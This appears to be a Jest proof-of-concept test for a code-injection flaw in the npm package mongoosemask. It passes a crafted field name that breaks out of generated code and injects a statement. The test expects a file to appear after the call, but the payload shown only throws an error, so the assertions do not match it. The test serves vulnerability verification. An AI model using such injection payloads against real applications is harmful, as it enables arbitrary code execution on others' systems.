test("Arbitrary code execution in mongoosemask", () => {
  expect.assertions(2);
  const fs = require("fs");
  const mask = require("mongoosemask");
  const path = "./mongoosemask";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mask.mask({}, [
      'id"]; throw new Error()//',
    ]);
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
